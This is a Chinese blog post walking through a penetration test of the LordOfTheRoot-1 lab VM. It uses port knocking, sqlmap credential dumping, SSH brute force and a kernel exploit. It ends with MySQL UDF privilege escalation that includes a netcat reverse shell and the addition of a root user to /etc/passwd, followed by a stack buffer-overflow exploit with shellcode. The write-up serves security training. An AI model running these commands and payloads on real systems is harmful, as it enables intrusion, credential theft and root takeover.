<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>渗透-LordOfTheRoot-1 | xxxRetr0</title><meta name="keywords" content="Pentest"><meta name="author" content="xxxRetr0"><meta name="copyright" content="xxxRetr0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="（em里面好多图上传图床失败了没注意，后面找个时间重新做下） 1、查询靶场IP：nmap -sP 192.168.133.0&#x2F;24Nmap scan report for localhost (192.168.133.133)  2、nmap -p- 192.168.133.133仅仅开放了22端口！  nmap -sS -sV -T5 -A -p22 192.168.133.133  这里可以看">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透-LordOfTheRoot-1">
<meta property="og:url" content="http://example.com/2024/02/24/%E6%B8%97%E9%80%8F-LordOfTheRoot-1/index.html">
<meta property="og:site_name" content="xxxRetr0">
<meta property="og:description" content="（em里面好多图上传图床失败了没注意，后面找个时间重新做下） 1、查询靶场IP：nmap -sP 192.168.133.0&#x2F;24Nmap scan report for localhost (192.168.133.133)  2、nmap -p- 192.168.133.133仅仅开放了22端口！  nmap -sS -sV -T5 -A -p22 192.168.133.133  这里可以看">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2024-02-24T02:59:59.000Z">
<meta property="article:modified_time" content="2024-02-24T03:00:25.772Z">
<meta property="article:author" content="xxxRetr0">
<meta property="article:tag" content="Pentest">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/02/24/%E6%B8%97%E9%80%8F-LordOfTheRoot-1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '渗透-LordOfTheRoot-1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-02-24 11:00:25'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="xxxRetr0" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">51</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">xxxRetr0</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透-LordOfTheRoot-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-02-24T02:59:59.000Z" title="Created 2024-02-24 10:59:59">2024-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-02-24T03:00:25.772Z" title="Updated 2024-02-24 11:00:25">2024-02-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透-LordOfTheRoot-1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>（em里面好多图上传图床失败了没注意，后面找个时间重新做下）</p>
<p>1、查询靶场IP：<br>nmap -sP 192.168.133.0/24<br>Nmap scan report for localhost (192.168.133.133)</p>
<p><img src="https://s2.loli.net/2024/02/23/vhRncAx5EKlBkfJ.png" alt="image-20240223164616719"></p>
<p>2、nmap -p- 192.168.133.133<br>仅仅开放了22端口！</p>
<p><img src="/.com//Users\17519\AppData\Roaming\Typora\typora-user-images\image-20240223164821574.png" alt="image-20240223164821574"></p>
<p>nmap -sS -sV -T5 -A -p22 192.168.133.133</p>
<p><img src="https://s2.loli.net/2024/02/23/cmVtrO7eWz2avNJ.png" alt="image-20240223165139533"></p>
<p>这里可以看到ssh服务是开启的</p>
<p>3、ssh尝试登录<br>ssh 192.168.133.133<br>填写yes发现信息：Easy as 1,2,3<br>意思是让敲震端口3次！</p>
<p><img src="https://s2.loli.net/2024/02/23/bMIaHkPNLz5fcqW.png" alt="image-20240223165416315"></p>
<p>4、端口碰撞</p>
<p>端口试探（port knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机。</p>
<p>端口试探的主要目的是防治攻击者通过端口扫描的方式对主机进行攻击。端口试探类似于一次秘密握手协议，比如一种最基本的方式：发送一定序列的UDP、TCP数据包。当运行在主机上的daemon程序捕捉到数据包以后，如果这个序列正确，则开启相应的端口，或者防火墙允许客户端通过。</p>
<p>由于对外的Linux服务器通过限制IP地址的方式来控制访问，因此可以利用这种端口试探方式来进行防火墙对于访问IP地址的控制。</p>
<p>如何进行端口碰撞？</p>
<p>首先需要我们知道端口碰撞的序列，否则暴力碰撞开启的机会太小。</p>
<p>1）第一种方法：knock 命令<br>linux安装：sudo apt install knockd</p>
<p>使用：<br>knock <IP> <PORT1> <PORT2> <PORT3> <PORT4> -v<br>例如需要碰撞 172.16.1.1 的 3，4，7，8 端口：<br>knock 192.168.133.133 1 2 3 -v</PORT4></PORT3></PORT2></PORT1></IP></p>
<p><img src="/.com//Users\17519\AppData\Roaming\Typora\typora-user-images\image-20240223170233111.png" alt="image-20240223170233111"></p>
<p>2）hping3：TCP/IP数据包组装/分析工具<br>hping3 -S [IP地址] -p 1 -c 1</p>
<p>hping3 -S 192.168.133.133 -p 1 -c 1<br>hping3 -S 192.168.133.133 -p 2 -c 1<br>hping3 -S 192.168.133.133 -p 3 -c 1</p>
<p>-S（–syn）：SYN是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN-ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。<br>-p –destport： 目的端口（默认为0），可同时指定多个端口<br>-c –count：指定数据包的次数</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30247635/article/details/86243448">https://blog.csdn.net/qq_30247635/article/details/86243448</a></p>
<p>敲震三次后：<br>nmap全端口查看情况！nmap -p- 192.168.133.133<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>1337/tcp open  waste</p>
<p>这里可以看到开放了1337端口</p>
<p><img src="/.com//Users\17519\AppData\Roaming\Typora\typora-user-images\image-20240223170200752.png" alt="image-20240223170200752"></p>
<p>5、信息枚举：<a target="_blank" rel="noopener" href="http://192.168.133.133:1337/">http://192.168.133.133:1337/</a><br>枚举到存在：<br><a target="_blank" rel="noopener" href="http://192.168.133.133:1337/robots.txt">http://192.168.133.133:1337/robots.txt</a><br>在F12调试界面发现：</p>
<p>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh</p>
<p>在kali通过base64转码：<br>echo ‘THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh’ | base64 -d<br>Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</p>
<p>发现还是base64继续转码：<br>echo ‘Lzk3ODM0NTIxMC9pbmRleC5waHA=’ | base64 -d<br>/978345210/index.php<br>发现目录！</p>
<p><img src="/.com//Users\17519\AppData\Roaming\Typora\typora-user-images\image-20240223170829166.png" alt="image-20240223170829166"></p>
<p>6、SQLmap注入</p>
<p>信息枚举：<a target="_blank" rel="noopener" href="http://192.168.133.133:1337/978345210/index.php">http://192.168.133.133:1337/978345210/index.php</a><br>发现：Welcome to the Gates of Mordor</p>
<p>1）爆破数据库库信息<br>sqlmap -o -u “<a target="_blank" rel="noopener" href="http://192.168.133.133:1337/978345210/index.php&quot;">http://192.168.133.133:1337/978345210/index.php&quot;</a> –forms –dbs</p>
<hr>
<p>Optimization<br>-o：开启所有优化开关<br>–predict-output：预测常见的查询输出<br>–keep-alive：使用持久的HTTP(S)连接<br>–null-connection：从没有实际的HTTP响应体中检索页面长度<br>–threads=THREADS：设置请求的并发数<br>–forms参数，sqlmap会自动从-u中的url获取页面中的表单进行测试</p>
<p>available databases [4]:<br>[<em>] information_schema<br>[</em>] mysql<br>[<em>] performance_schema<br>[</em>] Webapp</p>
<p>爆破出了数据库四个！继续获取webapp数据表信息</p>
<p><img src="/.com//Users\17519\AppData\Roaming\Typora\typora-user-images\image-20240223171825132.png" alt="image-20240223171825132"></p>
<p>2）爆破数据库表信息<br>sqlmap -o -u “<a target="_blank" rel="noopener" href="http://192.168.133.133:1337/978345210/index.php&quot;">http://192.168.133.133:1337/978345210/index.php&quot;</a> –forms -D Webapp –tables</p>
<p>Database: Webapp<br>[1 table]<br>+——-+<br>| Users |<br>+——-+<br>可以看到Users数据表，继续查看数据表信息！</p>
<p>3）爆破数据库表字段信息</p>
<p>sqlmap -o -u “<a target="_blank" rel="noopener" href="http://192.168.133.133:1337/978345210/index.php&quot;">http://192.168.133.133:1337/978345210/index.php&quot;</a> –forms -D Webapp -T Users –columns</p>
<p>(-D dbname指定数据库名称、-T tablename：指定某数据表的名称、–columns：列出指定表上的所有列)</p>
<p>Database: Webapp<br>Table: Users<br>[3 columns]<br>+———-+————–+<br>| Column   | Type         |<br>+———-+————–+<br>| id       | int(10)      |<br>| password | varchar(255) |<br>| username | varchar(255) |<br>+———-+————–+<br>可看到数据库Webapp的表Users中存在字段id,password,username信息！</p>
<p>4）爆破字段内容信息</p>
<p>sqlmap -o -u “<a target="_blank" rel="noopener" href="http://192.168.133.133:1337/978345210/index.php&quot;">http://192.168.133.133:1337/978345210/index.php&quot;</a> –forms -D Webapp -T Users –columns -C id,username,password –dump</p>
<p>(-D dbname:指定数据库名称、-T tablename:指定某数据表名称、-C Cnmme:指定列名、–dump:导出列里面的字段)</p>
<p><img src="https://s2.loli.net/2024/02/23/mQNryZnIvKWgwUk.png" alt="image-20240223173704529"></p>
<p>获得用户名密码，那么来爆破下！<br>user.txt：<br>frodo<br>smeagol<br>aragorn<br>legolas<br>gimli</p>
<p>pass.txt：<br>iwilltakethering<br>MyPreciousR00t<br>AndMySword<br>AndMyBow<br>AndMyAxe</p>
<p>7、SSH爆破-MSF、Hydra<br>1）Hydra爆破<br>hydra -L user.txt -P pass.txt 192.168.133.133 ssh</p>
<p>[22][ssh] host: 192.168.133.133   login: smeagol   password: MyPreciousR00t</p>
<p>2）MSF爆破ssh</p>
<p>若有用户名和密码字典的话，使用auxiliary/scanner/ssh/ssh_login模块</p>
<p>若不知道，使用auxiliary/scanner/ssh/ssh_enumusers模块先探测用户名是否存在</p>
<p><img src="https://s2.loli.net/2024/02/23/q5BmWRy82lk9QSD.png" alt="image-20240223180155313"></p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/huweiliyi/article/details/105590291">https://blog.csdn.net/huweiliyi/article/details/105590291</a></p>
<p>search ssh_login<br>use auxiliary/scanner/ssh/ssh_login<br>set rhosts 192.168.133.133<br>set user_file /home/kali/桌面/lordof/user.txt<br>set pass_file /home/kali/桌面/lordof/pass.txt<br>set stop_on_success true</p>
<p>Success: ‘smeagol:MyPreciousR00t’<br>用户名：smeagol<br>密码：MyPreciousR00t</p>
<p><img src="https://s2.loli.net/2024/02/23/fzsmOP5tBnNpVvu.png" alt="image-20240223180822982"></p>
<p>8、SSH登录提权<br>ssh <a href="mailto:&#115;&#109;&#101;&#97;&#x67;&#111;&#x6c;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#x33;&#x33;&#x2e;&#49;&#x33;&#51;">&#115;&#109;&#101;&#97;&#x67;&#111;&#x6c;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#x33;&#x33;&#x2e;&#49;&#x33;&#51;</a><br>MyPreciousR00t</p>
<p>9、EXP内核提权</p>
<p>lsb_release -a<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kelamoyujuzhen/p/9691113.html">Linux命令——lsb_release - 克拉默与矩阵 - 博客园 (cnblogs.com)</a></p>
<p><img src="/.com//Users\17519\AppData\Roaming\Typora\typora-user-images\image-20240224103121438.png" alt="image-20240224103121438"></p>
<p>谷歌搜索：Ubuntu 14.04 exploit<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39166">https://www.exploit-db.com/exploits/39166</a></p>
<p>searchsploit 39166<br>locate linux/local/39166.c<br>cp /usr/share/exploitdb/exploits/linux/local/39166.c /root/桌面/lord</p>
<p>python -m SimpleHTTPServer 8081<br>wget <a target="_blank" rel="noopener" href="http://192.168.133.19:8081/39166.c">http://192.168.133.19:8081/39166.c</a></p>
<p>gcc 39166.c -o test<br>chmod +x test<br>./test<br>cd /root<br>cat Flag.txt：<br>“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”<br>– Gandalf</p>
<hr>
<p>10、Mysql UDF提权</p>
<p>UDF提权先查看mysql版本！<br>dpkg -l | grep mysql   –查看历史安装包版本<br>5.5.44</p>
<p>查看mysql运行权限是不是root！<br>ps aux | grep root   —查看mysql进程信息</p>
<p>在寻找mysql账号密码！<br>find / -name login.*<br>发现信息：/var/www/978345210/login.php</p>
<p>grep “password” -rn 存在password信息：<br>new mysqli(‘localhost’, ‘root’, ‘darkshadow’, ‘Webapp’);</p>
<p>获得mysql密码：<br>darkshadow</p>
<p>登录mysql：<br>mysql -uroot -pdarkshadow</p>
<p>首先看一下是否满足写入条件：<br>show global variables like ‘secure%’;<br>是可以进行UDF提权的！</p>
<p>查看插件目录：<br>show variables like ‘%plugin%’;<br>插件目录在：/usr/lib/mysql/plugin/</p>
<p>查看能否远程登陆：<br>use mysql;<br>select user,host from user;</p>
<h2 id="只能本地登录！"><a href="#只能本地登录！" class="headerlink" title="只能本地登录！"></a>只能本地登录！</h2><p>MySQL中，BLOB是一个二进制大型对象，是一个可以存储大量数据的容器，它能容纳不同大小的数据。BLOB类型实际是个类型系列（TinyBlob、Blob、MediumBlob、LongBlob），除了在存储的最大信息量上不同外，他们是等同的。</p>
<p>MySQL的四种BLOB类型：<br>类型           大小(单位：字节)<br>TinyBlob      最大 255<br>Blob          最大 65K<br>MediumBlob    最大 16M<br>LongBlob      最大 4G </p>
<p>可以利用lib_mysqludf_sys提供的函数执行系统命令，lib_mysqludf_sys：<br>sys_eval，执行任意命令，并将输出返回<br>sys_exec，执行任意命令，并将退出码返回。<br>sys_get，获取一个环境变量。<br>sys_set，创建或修改一个环境变量。</p>
<p>cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so .<br>mv lib_mysqludf_sys_32.so test.so</p>
<p>mysql -uroot -pdarkshadow<br>use mysql<br>create table test(test longblob);<br>insert into test values (load_file(‘/tmp/test.so’));<br>select * from test into dumpfile ‘/usr/lib/mysql/plugin/test.so’;<br>create function sys_exec returns string soname ‘test.so’;<br>select * from mysql.func;<br>select sys_exec(‘chmod u+s /usr/bin/find’);</p>
<h2 id="find-exec-‘-bin-sh’"><a href="#find-exec-‘-bin-sh’" class="headerlink" title="find / -exec ‘/bin/sh’ ;"></a>find / -exec ‘/bin/sh’ ;</h2><p>拓展：或者利用sys_exec、sys_eval</p>
<p>select sys_exec(‘nc -nv 192.168.133.19 6677 -e /bin/bash’);</p>
<p>openssl passwd test1<br>YpIR51FecR9AY<br>select sys_exec(‘echo “test1:Ef8ipBmhp5pnE:0:0:root:/root:/bin/bash” &gt;&gt; /etc/passwd’);</p>
<hr>
<p>11、缓冲区溢出漏洞</p>
<p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。<br>ESP始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了。</p>
<p>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。<br>EBP存储着当前函数栈底的地址，栈底通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）。</p>
<p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。<br>EIP存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。<br>可以说如果控制了EIP寄存器的内容，就控制了进程——我们让EIP指向哪里，CPU就会去执行哪里的指令。</p>
<p>查看SUID弱点值：</p>
<h2 id="find-perm-g-s-o-perm-4000-type-l-maxdepth-3-exec-ls-ld-2-gt-dev-null"><a href="#find-perm-g-s-o-perm-4000-type-l-maxdepth-3-exec-ls-ld-2-gt-dev-null" class="headerlink" title="find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} ; 2&gt;/dev/null"></a>find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} ; 2&gt;/dev/null</h2><p>file命令比较每个文件的哈希值：<br>file /SECRET/door1/file /SECRET/door2/file /SECRET/door3/file</p>
<p>或者使用du -b查看字节：<br>du -b /SECRET/door1/file /SECRET/door2/file /SECRET/door3/file</p>
<p>7370    /SECRET/door1/file<br>5150    /SECRET/door2/file<br>7370    /SECRET/door3/file</p>
<p>或者使用ls -lahR比较创建的文件大小/日期：<br>cd /SECRET/</p>
<h2 id="ls-lahR"><a href="#ls-lahR" class="headerlink" title="ls -lahR"></a>ls -lahR</h2><p>使用python命令快速模糊判断多少个字符会导致程序崩溃。Python有-c参数，允许代码直接从shell执行：</p>
<p>./file $(python -c ‘print “A” * 200’)<br>Illegal instruction (core dumped)<br>发现存在溢出值，需要把文件拷贝出来进行本地分析！</p>
<p>base64文件拷贝：<br>base64 file    —-将file二进制文件转换base<br>然后复制到文本中：base64.txt<br>cat base64.txt | base64 -d &gt; file   —将文本文件转换回可执行文件<br>检查MD5和sha1值：<br>file file<br>md5sum file</p>
<p>这时候就讲文件拷贝到kali本地进行分析。</p>
<hr>
<p>方法1：<br>安装pwndbg</p>
<p>常见命令：<br><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4292771/blog/3305933">https://my.oschina.net/u/4292771/blog/3305933</a></p>
<p>记得更新源：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42380348/article/details/89959761">https://blog.csdn.net/weixin_42380348/article/details/89959761</a></p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a><br>cd pwndbg<br>sudo ./setup.sh<br>这里一定要更新源，在用代理更新下载！如果要修改就执行：<br>vi ~/.gdbinit    —用哪个就注释即可</p>
<p>1）调试file<br>gdb -q ./file    —gdb调试file文件</p>
<p>2）生成1000位值<br>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</p>
<p>3）GDB执行值<br>run Aa0A………<br>0x41376641 in ?? ()<br>查看到错误点在41376641。</p>
<p>4）解析错误点判断偏移量：<br>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641<br>[*] Exact match at offset 171<br>查看到偏移量为171。</p>
<p>5）尝试在偏移量171溢出后情况：<br>r $(python -c ‘print “A” * 171 + “B” * 4’)<br>EIP: 0x42424242 (‘BBBB’)<br>可看到EIP已经被填充BBBB可控制。</p>
<p>6）查看ASLR设置：<br>cat /proc/sys/kernel/randomize_va_space<br>2<br>或者：<br>sysctl -a –pattern randomize<br>kernel.randomize_va_space = 2</p>
<p>0 = 关闭<br>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）<br>2 = 全随机。除了1中所述，还有heap。<br>说明存在随机化！！！其实就算关闭了ASLR，在root</p>
<p>权限下还执行了计划任务switcher.py每三分钟变换一次值，还会打乱缓冲区溢出的“ buf”文件，因此让缓冲区溢出难度加大！</p>
<p>参考资料：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a></p>
<p>绕过ASLR的一种方法是通过编写一个自动循环脚本来强制堆栈，接下来要放入payload需要进行nop sled来爆破一个空间出来！</p>
<p>7）Nop空间测试ESP：<br>run $(python -c ‘print “A” * 171 + “B” * 4 + “\x90” * 2000’)<br>x/s $esp<br>0xffffc810:    ‘\220’ &lt;repeats 200 times&gt;…<br>这时候ESP变了，指向了ffffc810地址，这是nop sled的地址开始处，当ESP指向该地址处后，就会执行栈堆空间的payload获得shell，那么接下来就是要爆破<br>nop sled被访问。</p>
<p>8）恶意payload<br>peda help shellcode –– 关于 shellcode 的帮助<br>shellcode search exec –– 如何使用 ‘exec’ 搜索所有 shellcode<br>shellcode display 841 –– 显示找到的代码的来源</p>
<p>shellcode generate x86/linux exec –– 生成代码<br>shellcode = (<br>    “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31”<br>    “\xc9\x89\xca\x6a\x0b\x58\xcd\x80”<br>)</p>
<p>9）检查文件是否做了安全措施：<br>checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : disabled<br>PIE       : disabled<br>RELRO     : disabled</p>
<p>10）增加nop sled被访问机会：可以增加10000….<br>run $(python -c ‘print “A” * 171 + “\x60\xc8\xff\xff” + “\x90” * 20000 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80”‘)</p>
<p>0x ffffc860<br>ff ff c8 60<br>\x60\xc8\xff\xff<br>等一分钟左右就能获得shell！</p>
<p>11）for循环爆破找nop碰撞执行shell：<br>for a in {1..1000}; do ./file $(python -c ‘print “A” * 171 + “\xa0\x64\x8b\xbf” + “\x90” * 20000 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80”‘); done</p>
<p>如果文件在几分钟后随机变动了，不在该目录底下，在没有for循环nop拿到shell后，又得跑到溢出file的目录下载执行一次for，很麻烦！</p>
<hr>
<p>缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p>
<p>方法2：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/missmxr/article/details/121451920">https://blog.csdn.net/missmxr/article/details/121451920</a></p>
<p>1）进入door1，只有file文件，尝试分析猜测文件<br>objdump -d –no-show-raw-insn file   —查看可执行函数的十六进制显示file</p>
<p>strings file<br>查看door2，door3目录，都只有file文件，但是分析时发现door2下的file存在strcpy！</p>
<p>参考百度百科熟悉strcpy：<br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin">https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30709635/article/details/99100913">https://blog.csdn.net/weixin_30709635/article/details/99100913</a></p>
<p>2）msf生成1000字符串，使用gdb调试<br>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</p>
<p>gdb file<br>run ….</p>
<p>3）查找溢出位置<br>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641</p>
<p>溢出位置为171！验证下eip的内容！</p>
<p>如果存在溢出，肯定要写入恶意代码，那么有没有写入的权限程序，往下查看！</p>
<p>4）vmmap查看信息  栈溢出</p>
<p>STACK：栈，用来保存函数运行时的临时变量等<br>HEAP：堆，一般是主动编写代码来分配和回收堆内存<br>CODE: 代码段，是用来存放代码的<br>DATA：数据段，一般用来存放全局变量<br>参考：<a target="_blank" rel="noopener" href="https://ch4r1l3.github.io/2018/06/22/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%B8%89%E7%AB%A0%E2%80%94%E2%80%94gdb%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">https://ch4r1l3.github.io/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/</a></p>
<p>5）验证EIP<br>r $(python -c ‘print “A”*171 + “B”*4 + “C”*20’)</p>
<p>6）验证ESP<br>x/20b $esp</p>
<p>存在c的，那么确认坏字符！</p>
<p>7）确认坏字符<br>缓冲区溢出的在生成shellcode时，会影响输入的字符，比如’n’字符会终止输入，会截断输入导致我们输入的字符不能完全进入缓冲区。常见的坏字符有x0a、x0b、x00</p>
<h2 id="现在生成一串与字节数组相同的坏字符。以下-python-脚本可用于生成从-x01-到-xff-的坏字符字符串："><a href="#现在生成一串与字节数组相同的坏字符。以下-python-脚本可用于生成从-x01-到-xff-的坏字符字符串：" class="headerlink" title="现在生成一串与字节数组相同的坏字符。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串："></a>现在生成一串与字节数组相同的坏字符。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串：</h2><p>#!/usr/bin/env python<br>from <strong>future</strong> import print_function</p>
<p>for x in range(1, 256):<br>    print(“\x” + “{:02x}”.format(x), end=’’)</p>
<h2 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h2><p>r $(python -c ‘print “A”*171 + “B”*4 + “”‘)</p>
<p>x/256x $esp   —如果出问题就x和b换用</p>
